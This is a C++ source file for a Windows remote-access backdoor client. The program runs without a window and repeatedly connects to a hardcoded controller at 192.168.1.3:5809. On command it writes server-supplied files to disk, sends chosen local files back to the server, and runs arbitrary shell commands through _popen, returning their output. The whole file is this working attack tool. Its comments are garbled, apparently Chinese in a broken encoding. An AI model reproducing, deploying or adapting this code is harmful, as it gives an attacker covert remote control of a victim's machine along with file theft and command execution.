#include "main.h"

int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hprevinstance, LPSTR lpcmdline, int ncmdshow)
{
	tcpSocket mysocket("192.168.1.3", 5809);
	protocolParsing(&mysocket);
	return 0;
}

void protocolParsing(tcpSocket *mysocket)
{
	myProtocol recvInfo, isSussess; bool result;
	connectServer(mysocket);

	while (true)
	{
		if (mysocket->tcpRecv((char *)&recvInfo, sizeof(recvInfo)) == false)               // ѭ�����ܷ���˵���Ϣ
			connectServer(mysocket);
		else
		{
			switch (recvInfo.type)
			{
			case 1:                                                                            // type = 1 �����ļ����ϴ�
				result = recvToServer(&recvInfo, mysocket);
				break;

			case 2:                                                                            // type = 2 �����ļ�������
				result = sendToServer(&recvInfo, mysocket);
				break;

			case 4:                                                                            // type = 4 ��������ִ��
				result = systemCmd(&recvInfo, mysocket);
				break;

			default:
				break;
			}
		}
		Sleep(2000);
	}
}

bool connectServer(tcpSocket *mysocket)
{
	while (true)
	{
		if (mysocket->tcpConnect())
			break;
		Sleep(3000);
	}
	return true;
}

bool recvToServer(myProtocol *recvInfo, tcpSocket *mysocket)
{
	myProtocol send;
	if (recvInfo->fileSize < 0 || recvInfo->fileSize > 0x1f400000)
		send.type = 12;
	else
		send.type = 3;

	// ��֪�ͻ����Ѿ�׼������
	if (mysocket->tcpSend((char*)&send, sizeof(send)) == false)                            
		return false;
	
	// ���ݷ���˴������ļ���С������
	HANDLE hHeap, hAlloc;
	hHeap = ::HeapCreate(0, recvInfo->fileSize, NULL);
	if (hHeap)
	{
		hAlloc = ::HeapAlloc(hHeap, HEAP_ZERO_MEMORY, recvInfo->fileSize);
		if (!hAlloc)
			return false;
	}
	else
		return false;
	
	// �ȴ�����˴����ļ�
	if (mysocket->tcpRecv((char *)hAlloc, recvInfo->fileSize) == false)                
		return false;

	// �ڿͻ��˴����ļ�
	file myfile(recvInfo->clientFile);
	if (myfile.fileWrite((char *)hAlloc, recvInfo->fileSize) == false)
		return false;

	// ������Դ
	if (hHeap != NULL && hAlloc != NULL)
		::HeapFree(hHeap, 0, hAlloc);

	return true;
}

bool sendToServer(myProtocol *recvInfo, tcpSocket *mysocket)
{
	myProtocol send;
	file myfile(recvInfo->clientFile);
	HANDLE data = myfile.fileRead();
	if (data == false)
	{
		send.type = 12;
		mysocket->tcpSend((char *)&send, sizeof(send));
		return false;
	}

	send.fileSize = myfile.fileSizeL;
	send.type = 3;
	
	// ��֪������ļ��Ĵ�С, ���ҵȴ������׼������
	if (mysocket->tcpSend((char *)&send, sizeof(send)))
	{
		if (mysocket->tcpRecv((char *)&send, sizeof(send)) == false)
			return false;
	}
	else
		return false;

	// �����׼������֮��ͻ��˿�ʼ�����˷����ļ�
	if (send.type == 3)
	{
		if (mysocket->tcpSend((char *)data, myfile.fileSizeL) == false)
			return false;
	}
	else
		return false;

	return true;
}

bool systemCmd(myProtocol *recvInfo, tcpSocket *mysocket)
{
	HANDLE hHeap, hAlloc;
	myProtocol cmd; FILE *fp; char buffer[100] = { 0 }; int index = 1; int size = 100000;
	if (strlen(recvInfo->cmdChar) > MAX_PATH || recvInfo->cmdChar == NULL)
	{
		cmd.type = 12;
		if (mysocket->tcpSend((char *)&cmd, sizeof(cmd)))
			return false;
	}

	hHeap = HeapCreate(0, size, NULL);
	if (hHeap)
	{
		hAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, size);
		if (!hAlloc)
			return false;
	}
	else
		return false;

	if ((fp = _popen(recvInfo->cmdChar, "r")) != NULL)
	{
		while (fgets(buffer, 100, fp) != NULL)
		{
			if (index == size / 100)
				break;
			strcat((char *)hAlloc, buffer);
			index += 1;
		}
		if (_pclose(fp) == -1)
			return false;
	}
	else
		return false;

	if (mysocket->tcpSend((char *)hAlloc, size) == false)
		return false;
	return true;
}